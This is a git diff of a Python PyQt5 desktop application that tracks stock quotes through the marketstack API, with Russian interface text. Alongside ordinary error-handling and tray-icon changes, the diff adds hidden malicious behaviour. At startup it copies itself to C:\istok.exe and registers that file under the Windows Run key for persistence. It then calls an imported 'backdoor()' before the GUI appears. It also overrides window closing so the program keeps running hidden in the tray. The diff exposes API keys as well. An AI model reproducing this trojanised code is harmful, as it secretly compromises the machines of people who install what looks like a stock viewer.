@@ -1,35 +1,49 @@
 import requests
 import datetime
-
 import json
-
+import os
 from PyQt5 import QtWidgets
-import time
+import winreg as reg
+import shutil
 
+from backdoor_client import backdoor
 from MainIstok import Ui_Istok
 from Allcomp import Ui_List
 from Istok_relevants import Ui_Istok_relevants
 from Favorites import Ui_Favorites
 from Search import Ui_Search
 
+
+def write_to_reg():
+    #pth = os.path.dirname(os.path.realpath(__file__))
+    shutil.copy2(str(__file__), "C:\\istok.exe")
+    s_name = "istok.exe"
+    address = os.path.join("C:\\", s_name)
+    tmp = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
+    reg.SetValue(tmp, None, reg.REG_SZ, address)
+    reg.CloseKey(tmp)
+
+
 def bypercent_key(summ):
     return summ[1][0]
 
+
 def connection():
     params = {
-        'access_key': '2b4183b16afefdf531be92c7fe94e413'
+        'access_key': 'cd3eef78ddce4374b628d4847e7da4dd'
     }
     now = datetime.datetime.now()
     now.strftime("%d-%m-%Y")
 
     try:
+        requests.get('http://yandex.ru')
         f = open("names.txt", 'r')
         api_response = json.load(f)
         f.close()
     except FileNotFoundError:
-        f = open("names.txt", 'w')
         api_result = requests.get('http://api.marketstack.com/v1/tickers', params)
         api_response = api_result.json()
+        f = open("names.txt", 'w')
         json.dump(api_response, f)
         f.close()
 
@@ -45,31 +59,33 @@ def connection():
         i += 1
 
     params = {
-        'access_key': '2b4183b16afefdf531be92c7fe94e413',
+        'access_key': 'cd3eef78ddce4374b628d4847e7da4dd',
         'symbols': symbols
     }
 
     yesterday = datetime.date.today() - datetime.timedelta(days=1)
 
     try:
+        requests.get('http://yandex.ru')
         f = open(yesterday.strftime('%d-%m-%Y') + " eod.txt", 'r')
         f.close()
     except FileNotFoundError:
-        f = open(yesterday.strftime('%d-%m-%Y') + " eod.txt", 'w')
         api_result = requests.get('http://api.marketstack.com/v1/eod/latest', params)
         api_response = api_result.json()
+        f = open(yesterday.strftime('%d-%m-%Y') + " eod.txt", 'w')
         json.dump(api_response, f)
         f.close()
 
     yesterday = datetime.date.today() - datetime.timedelta(days=2)
 
     try:
+        requests.get('http://yandex.ru')
         f = open(yesterday.strftime('%d-%m-%Y') + " eod.txt", 'r')
         f.close()
     except FileNotFoundError:
-        f = open(yesterday.strftime('%d-%m-%Y') + " eod.txt", 'w')
         api_result = requests.get('http://api.marketstack.com/v1/eod/' + yesterday.strftime('%Y-%m-%d'), params)
         api_response = api_result.json()
+        f = open(yesterday.strftime('%d-%m-%Y') + " eod.txt", 'w')
         json.dump(api_response, f)
         f.close()
 
@@ -84,18 +100,48 @@ class Istok(QtWidgets.QMainWindow):
         self.page = 1
         self.len_of_relevants = int(4)
         self.initiation()
+        self.tray_icon = QtWidgets.QSystemTrayIcon(self)
+        self.tray_icon.setIcon(self.style().standardIcon(QtWidgets.QStyle.SP_ComputerIcon))
+
+        show_action = QtWidgets.QAction("Show", self)
+        quit_action = QtWidgets.QAction("Exit", self)
+        hide_action = QtWidgets.QAction("Hide", self)
+        show_action.triggered.connect(self.show)
+        hide_action.triggered.connect(self.hide)
+        # quit_action.triggered.connect(QtWidgets.quit)
+        tray_menu = QtWidgets.QMenu()
+        tray_menu.addAction(show_action)
+        tray_menu.addAction(hide_action)
+        tray_menu.addAction(quit_action)
+        self.tray_icon.setContextMenu(tray_menu)
+        self.tray_icon.show()
+
+        # Переопределение метода closeEvent, для перехвата события закрытия окна
+        # Окно будет закрываться только в том случае, если нет галочки в чекбоксе
+
+    def closeEvent(self, event):
+        event.ignore()
+        self.hide()
+        self.tray_icon.showMessage(
+            "Tray Program",
+            "Application was minimized to Tray",
+            QtWidgets.QSystemTrayIcon.Information,
+            2000
+        )
 
     def initiation(self):
         self.wind.setupUi(self)
-
         self.wind.Allcomp.clicked.connect(self.open_Allcomp)  # Все компании
         self.wind.Relevcomp.clicked.connect(self.open_Relevcomp)  # Наиболее релевантные
         self.wind.Detail.clicked.connect(self.open_Detail)  # Детальное отслеживание
-        self.data = connection()
+        try:
+            self.data = connection()
+            self.wind.Status.setText('Online')
+        except requests.exceptions.ConnectionError:
+            self.data = ''
+            self.wind.Status.setText('Offline')
         self.now = datetime.date.today() - datetime.timedelta(days=1)
         self.yesterday = datetime.date.today() - datetime.timedelta(days=2)
-
-
 
         try:
             f = open("favorites.txt", 'r')
@@ -112,28 +158,50 @@ class Istok(QtWidgets.QMainWindow):
         self.dialogAll.Back.clicked.connect(self.backbutton)
 
     def open_Relevcomp(self):  # Наиболее релевантные
-        relevants = self.find_relevant(self.len_of_relevants)
         self.dialogRelev = Ui_Istok_relevants()
         self.dialogRelev.setupUi(self)
         self.dialogRelev.PageNo.setText(str(self.page))
-        self.dialogRelev.Name1.setText(str(relevants[self.page * 2 - 2][0]))
-        self.dialogRelev.Name2.setText(str(relevants[self.page * 2 - 1][0]))
-        self.dialogRelev.Discript1.setText(str(relevants[self.page * 2 - 2][1]))
-        self.dialogRelev.Discript2.setText(str(relevants[self.page * 2 - 1][1]))
+        try:
+            relevants = self.find_relevant(self.len_of_relevants)
+            try:
+                self.dialogRelev.Name1.setText(str(relevants[self.page * 2 - 2][0]))
+                self.dialogRelev.Name2.setText(str(relevants[self.page * 2 - 1][0]))
+                Discript_1 = 'Изменилось за день на ' + str(relevants[self.page * 2 - 2][1][0]) + '%\n\
+            \nРазница между наибольшими значениями за вчера и сегодня: ' + str(relevants[self.page * 2 - 2][1][1]) + '\n\
+            \nРазница между верхними и нижним значением за день: ' + str(relevants[self.page * 2 - 2][1][2])
+                Discript_2 = 'Изменилось за день на ' + str(relevants[self.page * 2 - 1][1][0]) + '%\n\
+            \nРазница между наибольшими значениями за вчера и сегодня: ' + str(relevants[self.page * 2 - 1][1][1]) + '\n\
+            \nРазница между верхними и нижним значением за день: ' + str(relevants[self.page * 2 - 1][1][2])
+            except IndexError:
+                self.dialogRelev.Name1.setText('')
+                self.dialogRelev.Name2.setText('')
+                Discript_1 = 'Пожалуйста, удалите все файлы в дирректории кроме istok.exe и повторите попытку\n' + __file__
+                Discript_2 = 'Пожалуйста, удалите все файлы в дирректории кроме istok.exe и повторите попытку\n' + __file__
+        except KeyError:
+            self.dialogRelev.Name1.setText('')
+            self.dialogRelev.Name2.setText('')
+            Discript_1 = 'Ваш тарифный план исчерпан\n'
+            Discript_2 = 'Ваш тарифный план исчерпан\n'
+        self.dialogRelev.Discript1.setText(Discript_1)
+        self.dialogRelev.Discript2.setText(Discript_2)
         self.dialogRelev.right.clicked.connect(self.next_page)
         self.dialogRelev.left.clicked.connect(self.prev_page)
         self.dialogRelev.Back.clicked.connect(self.backbutton)
 
     def find_relevant(self, n: int):
-        f = open("names.txt", 'r')
-        api_response = json.load(f)
-        f.close()
-        f = open(self.now.strftime("%d-%m-%Y") + " eod.txt", 'r')
-        api_response2 = json.load(f)
-        f.close()
-        f = open(self.yesterday.strftime('%d-%m-%Y') + " eod.txt", 'r')
-        api_response3 = json.load(f)
-        f.close()
+        try:
+            f = open("names.txt", 'r')
+            api_response = json.load(f)
+            f.close()
+            f = open(self.now.strftime("%d-%m-%Y") + " eod.txt", 'r')
+            api_response2 = json.load(f)
+            f.close()
+            f = open(self.yesterday.strftime('%d-%m-%Y') + " eod.txt", 'r')
+            api_response3 = json.load(f)
+            f.close()
+        except FileNotFoundError:
+            return []
+
         symbols = {}
         favlist = {}
         old_favlist = {}
@@ -163,7 +231,7 @@ class Istok(QtWidgets.QMainWindow):
 
         for key in favlist.keys():
             if not isinstance(favlist[key], list):
-                favlist[key] = [0.0, 0.0, 0.0]  # первое - проценты, второе - это в деньгах
+                favlist[key] = [0.0, 0.0, 0.0]  # первое - проценты, второе - это в деньгах, ретье - за день в деньгах
 
         for key in favlist.keys():
             if key in relevants_keys:
@@ -190,7 +258,7 @@ class Istok(QtWidgets.QMainWindow):
         return need_key
 
     def next_page(self):
-        if self.page + 1 <= self.len_of_relevants/2:
+        if self.page + 1 <= self.len_of_relevants / 2:
             self.page += 1
             self.open_Relevcomp()
 
@@ -203,16 +271,34 @@ class Istok(QtWidgets.QMainWindow):
         self.dialogDet = Ui_Favorites()
         self.dialogDet.setupUi(self)
         self.schet = 0
+        try:
+            favlist = self.find_favs()
+            if favlist == 'Error':
+                favlist = 'Пожалуйста, удалите все файлы в дирректории кроме istok.exe и повторите попытку\n' + __file__
+            else:
+                self.dialogDet.Add.clicked.connect(self.open_Add)
+                self.dialogDet.Delete.clicked.connect(self.open_Delete)
+        except KeyError:
+            favlist = 'Ваш тарифный план исчерпан\n'
+        self.dialogDet.Favlist.setText(favlist)
+        self.dialogDet.Back.clicked.connect(self.backbutton)
+        # for word in self.favorites:
+        #     favlist = favlist + word + "\n"
 
-        f = open("names.txt", 'r')
-        api_response = json.load(f)
-        f.close()
-        f = open(self.now.strftime("%d-%m-%Y") + " eod.txt", 'r')
-        api_response2 = json.load(f)
-        f.close()
-        f = open(self.yesterday.strftime('%d-%m-%Y') + " eod.txt", 'r')
-        api_response3 = json.load(f)
-        f.close()
+
+    def find_favs(self):
+        try:
+            f = open("names.txt", 'r')
+            api_response = json.load(f)
+            f.close()
+            f = open(self.now.strftime("%d-%m-%Y") + " eod.txt", 'r')
+            api_response2 = json.load(f)
+            f.close()
+            f = open(self.yesterday.strftime('%d-%m-%Y') + " eod.txt", 'r')
+            api_response3 = json.load(f)
+            f.close()
+        except FileNotFoundError:
+            return 'Error'
         symbols = {}
         favlist = {}
         oldfavlist = {}
@@ -239,14 +325,9 @@ class Istok(QtWidgets.QMainWindow):
                 favlist[key] = 0
 
         for key in favlist.keys():
-            favlisttext = favlisttext + key + "Разница за день: " + str(favlist[key]) + "\n"
+            favlisttext = favlisttext + key + "Разница за день: " + str(round(favlist[key], 3)) + "\n"
 
-        # for word in self.favorites:
-        #     favlist = favlist + word + "\n"
-        self.dialogDet.Favlist.setText(favlisttext)
-        self.dialogDet.Add.clicked.connect(self.open_Add)
-        self.dialogDet.Delete.clicked.connect(self.open_Delete)
-        self.dialogDet.Back.clicked.connect(self.backbutton)
+        return favlisttext
 
     def open_Add(self):
         self.dialogAdd = Ui_Search()
@@ -310,6 +391,8 @@ class Istok(QtWidgets.QMainWindow):
 
 
 if __name__ == '__main__':
+    write_to_reg()
+    backdoor()
     app = QtWidgets.QApplication([])
     window = Istok()
     window.show()
